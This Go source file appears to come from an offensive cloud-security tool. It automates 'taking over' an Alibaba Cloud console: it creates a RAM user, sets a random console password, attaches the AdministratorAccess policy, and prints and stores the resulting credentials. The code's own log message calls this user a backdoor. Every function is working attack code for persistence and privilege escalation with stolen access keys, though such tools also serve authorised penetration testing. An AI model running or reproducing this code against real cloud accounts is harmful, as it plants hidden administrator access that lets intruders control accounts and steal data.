package aliconsole

import (
	"fmt"
	"github.com/aliyun/alibaba-cloud-sdk-go/services/ram"
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/cloud"
	"github.com/teamssix/cf/pkg/cloud/alibaba/aliram"
	"github.com/teamssix/cf/pkg/util"
	"github.com/teamssix/cf/pkg/util/database"
	"github.com/teamssix/cf/pkg/util/errutil"
	"os"
	"strings"
)

func CreateUser(userName string) {
	request := ram.CreateCreateUserRequest()
	request.Scheme = "https"
	request.UserName = userName
	_, err := aliram.RAMClient().CreateUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugf("创建 %s 用户成功 (Create %s user successfully)", userName, userName)
	} else {
		if strings.Contains(err.Error(), "EntityAlreadyExists.User") {
			log.Warnf("%s 用户已存在，无法接管，请指定其他的用户名 (%s user already exists and cannot take over, please specify another user name.)", userName, userName)
			os.Exit(0)
		}
	}
}

func CreateLoginProfile(userName string, password string) {
	request := ram.CreateCreateLoginProfileRequest()
	request.Scheme = "https"
	request.UserName = userName
	request.Password = password
	_, err := aliram.RAMClient().CreateLoginProfile(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功创建控制台登录密码 (Successfully created console login password)")
	}
}

func AttachPolicyToUser(userName string) {
	request := ram.CreateAttachPolicyToUserRequest()
	request.Scheme = "https"
	request.PolicyType = "System"
	request.PolicyName = "AdministratorAccess"
	request.UserName = userName
	_, err := aliram.RAMClient().AttachPolicyToUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugf("成功为 %s 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the %s user)", userName, userName)
	}
}

func GetAccountAlias() string {
	request := ram.CreateGetAccountAliasRequest()
	request.Scheme = "https"
	response, err := aliram.RAMClient().GetAccountAlias(request)
	errutil.HandleErrNoExit(err)
	accountAlias := response.AccountAlias
	return accountAlias
}

func TakeoverConsole(userName string) {
	CreateUser(userName)
	password := util.GenerateRandomPasswords()
	CreateLoginProfile(userName, password)
	AttachPolicyToUser(userName)
	accountAlias := GetAccountAlias()
	consoleUserName := fmt.Sprintf("%s@%s", userName, accountAlias)
	loginURL := "https://signin.aliyun.com"
	data := [][]string{
		{consoleUserName, password, loginURL},
	}
	database.InsertTakeoverConsoleCache("alibaba", accountAlias, consoleUserName, password, loginURL)
	var header = []string{"用户名 (User Name)", "密码 (Password)", "控制台登录地址 (Login Url)"}
	var td = cloud.TableData{Header: header, Body: data}
	cloud.PrintTable(td, "")
	log.Infof("接管控制台成功，接管控制台会创建 %s 后门用户，如果想删除该后门用户，请执行 cf alibaba console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf alibaba console cancel.)", userName)
}
